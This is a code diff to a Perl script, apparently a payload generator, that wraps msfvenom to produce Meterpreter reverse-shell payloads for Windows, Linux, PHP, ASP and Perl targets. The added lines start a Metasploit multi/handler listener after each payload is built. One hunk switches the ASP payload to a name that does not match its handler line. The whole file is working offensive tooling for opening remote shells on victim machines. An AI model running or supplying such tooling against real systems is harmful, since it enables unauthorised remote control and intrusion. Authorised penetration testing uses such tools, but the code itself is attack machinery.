@@ -117,6 +117,7 @@ sub generate_payload_windows {
 
     print "Windows payload generated: $output_file\n";
     system("msfconsole -qx 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $host;set LPORT $port;run'");
+
 }
 
 
@@ -128,6 +129,8 @@ sub generate_payload_linux {
     system($command);
 
     print "Linux payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LHOST $host;set LPORT $port;run'");
+
 }
 
 sub generate_payload_php {
@@ -137,15 +140,18 @@ sub generate_payload_php {
     my $command = "msfvenom -p $payload $options -f raw > $output_file";
     system($command);
     print "PHP payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload php/meterpreter_reverse_tcp;set LHOST $host;set LPORT $port;run'");
 }
 
 sub generate_payload_asp {
     my $output_file = "rakumsf.asp";
-    my $payload = "windows/meterpreter/reverse_tcp";
+    my $payload = "asp/meterpreter/reverse_tcp";
     my $options = "LHOST=$host LPORT=$port";
     my $command = "msfvenom -p $payload $options -f asp > $output_file";
     system($command);
     print "ASP payload generated: $output_file\n";
+   system("msfconsole -qx 'use exploit/multi/handler;set payload asp/meterpreter_reverse_tcp;set LHOST $host;set LPORT $port;run'");
+
 }
 
 sub generate_payload_perl {
@@ -155,6 +161,8 @@ sub generate_payload_perl {
     my $command = "msfvenom -p $payload $options -f raw > $output_file";
     system($command);
     print "Perl payload generated: $output_file\n";
+    system("msfconsole -qx 'use exploit/multi/handler;set payload cmd/unix/reverse_perl;set LHOST $host;set LPORT $port;run'");
+
 }
 
 sub generate_payload_python {
@@ -164,6 +172,7 @@ sub generate_payload_python {
     my $command = "msfvenom -p $payload $options -f raw > $output_file";
     system($command);
     print "Python payload generated: $output_file\n";
+    
 }
 
 sub generate_payload_jar {
